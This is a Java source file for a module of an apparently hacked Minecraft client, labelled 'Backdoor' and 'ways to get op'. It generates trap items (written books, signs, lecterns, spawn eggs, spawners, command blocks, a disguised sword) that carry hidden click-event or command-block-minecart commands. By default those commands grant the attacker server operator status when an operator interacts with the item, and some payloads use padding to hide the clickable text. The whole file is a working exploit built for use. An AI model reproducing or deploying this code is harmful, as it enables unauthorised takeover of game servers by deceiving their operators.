package net.shadow.feature.module;

import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.StringNbtReader;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.util.Identifier;
import net.minecraft.util.registry.Registry;
import net.shadow.Shadow;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.CustomValue;
import net.shadow.feature.configuration.MultiValue;
import net.shadow.utils.ChatUtils;

public class ForceOpModule extends Module {

    static final String bookauthor = Shadow.c.getSession().getProfile().getName();
    final MultiValue mode = this.config.create("Method", "Book", "Book", "Sign", "Command Block", "Lectern", "Spawn Egg", "Silent Egg", "Spawner", "SudoSword");
    final CustomValue<String> command = this.config.create("Command", "/execute run op " + Shadow.c.getSession().getUsername());
    final CustomValue<String> itemname = this.config.create("Name", "my cool item");
    final CustomValue<String> text = this.config.create("Content", "hello world");
    Item item = Registry.ITEM.get(new Identifier("written_book"));
    ItemStack stack = new ItemStack(item, 1);
    NbtCompound tag;

    public ForceOpModule() {
        super("Backdoor", "ways to get op", ModuleType.ITEMS);
    }

    @Override
    public void onEnable() {
        switch (mode.getThis()) {
            case "book":
                try {
                    item = Registry.ITEM.get(new Identifier("written_book"));
                    stack = new ItemStack(item, 1);
                    tag = StringNbtReader.parse("{title:\"" + itemname.getThis() + "\",author:\"" + bookauthor + "\",pages:['{\"text\":\"" + text.getThis() + "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         \",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + command.getThis() + "\"}}','{\"text\":\"\"}','{\"text\":\"\"}']}");
                    stack.setNbt(tag);

                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                    ChatUtils.message("Book Exploit Created");
                } catch (Exception ignored) {
                }

                break;

            case "sign":
                try {
                    item = Registry.ITEM.get(new Identifier("oak_sign"));
                    stack = new ItemStack(item, 1);
                    tag = StringNbtReader.parse("{display:{Name:'{\"text\":\"" + itemname.getThis() + "\"}'},BlockEntityTag:{Text1:'{\"text\":\"" + text.getThis() + "\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + command.getThis() + "\"}}'}}");
                    stack.setNbt(tag);

                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                    ChatUtils.message("Sign Exploit Created");
                } catch (Exception ignored) {
                }

                break;

            case "command block":
                try {
                    item = Registry.ITEM.get(new Identifier("command_block"));
                    stack = new ItemStack(item, 1);
                    tag = StringNbtReader.parse("{display:{Name:'{\"text\":\"" + itemname.getThis() + "\"}'},BlockEntityTag:{Command:\"" + command.getThis() + "\",powered:0b,auto:1b}}");
                    stack.setNbt(tag);

                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                    ChatUtils.message("Command Block Exploit Created");
                } catch (Exception ignored) {
                }

                break;

            case "spawn egg":
                try {
                    item = Registry.ITEM.get(new Identifier("cow_spawn_egg"));
                    stack = new ItemStack(item, 1);
                    tag = StringNbtReader.parse("{display:{Name:'{\"text\":\"" + itemname.getThis() + "\"}'},EntityTag:{id:\"minecraft:falling_block\",BlockState:{Name:\"minecraft:spawner\"},TileEntityData:{SpawnCount:8,SpawnRange:5,Delay:0,MinSpawnDelay:100,MaxSpawnDelay:100,MaxNearbyEntities:50,RequiredPlayerRange:50,SpawnData:{id:\"minecraft:falling_block\",BlockState:{Name:\"minecraft:redstone_block\"},Time:200,Passengers:[{id:\"minecraft:armor_stand\",Health:0f,Passengers:[{id:\"minecraft:falling_block\",BlockState:{Name:\"minecraft:activator_rail\",Properties:{powered:\"true\"}},Time:1,Passengers:[{id:\"minecraft:command_block_minecart\",Command:\"" + command.getThis() + "\"}]}]}]}},Time:200}}");
                    stack.setNbt(tag);

                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                    ChatUtils.message("Spawn Egg Exploit Created");
                } catch (Exception ignored) {
                }
                break;

            case "sudosword":
                try {
                    item = Registry.ITEM.get(new Identifier("emerald"));
                    stack = new ItemStack(item, 1);
                    tag = StringNbtReader.parse("{Enchantments:[{id:\"minecraft:sharpness\",lvl:255s}],display:{Name:'[{\"text\":\"Diamond Sword]\",\"color\":\"reset\",\"italic\":false},{\"text\":\"\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n\\\\n[\",\"color\":\"reset\",\"italic\":false},{\"text\":\"" + text.getThis() + " " + itemname.getThis() + "\",\"color\":\"red\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + command.getThis() + "\"}}]'}}");
                    stack.setNbt(tag);

                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                    ChatUtils.message("SudoSword Exploit Created");
                } catch (Exception ignored) {
                }
                break;

            case "silent egg":
                try {
                    item = Registry.ITEM.get(new Identifier("cow_spawn_egg"));
                    stack = new ItemStack(item, 1);
                    tag = StringNbtReader.parse("{display:{Name:'{\"text\":\"" + itemname.getThis() + "\"}'},EntityTag:{Command:\"" + command.getThis() + "\",Invulnerable:1b,Pos:[4.5d,1.0d,20.5d],id:\"minecraft:command_block_minecart\"}}");
                    stack.setNbt(tag);

                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                    ChatUtils.message("Silent Egg Exploit Created");
                } catch (Exception ignored) {
                }
                break;

            case "spawner":
                try {
                    item = Registry.ITEM.get(new Identifier("spawner"));
                    stack = new ItemStack(item, 1);
                    tag = StringNbtReader.parse("{display:{Name:'{\"text\":\"" + itemname.getThis() + "\"}'},BlockEntityTag:{SpawnCount:4,SpawnRange:10,Delay:1,MinSpawnDelay:1,MaxSpawnDelay:1,MaxNearbyEntities:32767,RequiredPlayerRange:32767,SpawnData:{id:\"minecraft:pig\",Passengers:[{id:\"minecraft:falling_block\",BlockState:{Name:\"minecraft:redstone_block\"},Time:1,Passengers:[{id:\"minecraft:armor_stand\",Health:0f,Passengers:[{id:\"minecraft:falling_block\",BlockState:{Name:\"minecraft:activator_rail\"},Time:1,Passengers:[{id:\"minecraft:command_block_minecart\",Command:\"" + command.getThis() + "\"}]}]}]}]},SpawnPotentials:[{Weight:1,Entity:{id:\"minecraft:pig\",Passengers:[{id:\"minecraft:falling_block\",BlockState:{Name:\"minecraft:redstone_block\"},Time:1,Passengers:[{id:\"minecraft:armor_stand\",Health:0f,Passengers:[{id:\"minecraft:falling_block\",BlockState:{Name:\"minecraft:activator_rail\"},Time:1,Passengers:[{id:\"minecraft:command_block_minecart\",Command:\"" + command.getThis() + "\"}]}]}]}]}}]}}");
                    stack.setNbt(tag);

                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                    ChatUtils.message("Spawner Exploit Created");
                } catch (Exception ignored) {
                }
                break;

            case "lectern":
                try {
                    item = Registry.ITEM.get(new Identifier("lectern"));
                    stack = new ItemStack(item, 1);
                    tag = StringNbtReader.parse("{BlockEntityTag:{Book:{id:\"minecraft:written_book\",Count:1b,tag:{title:\"\",author:\"\",pages:['{\"text\":\"" + text.getThis() + "                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          \",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + command.getThis() + "\"}}','{\"text\":\"\"}']}}}}");
                    stack.setNbt(tag);
                    Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36 + Shadow.c.player.getInventory().selectedSlot, stack));
                    ChatUtils.message("Lectern Exploit Created");
                } catch (Exception ignored) {
                }
                break;
        }
        this.setEnabled(false);
    }

    @Override
    public void onDisable() {
    }

    @Override
    public void onUpdate() {

    }

    @Override
    public void onRender() {

    }
}
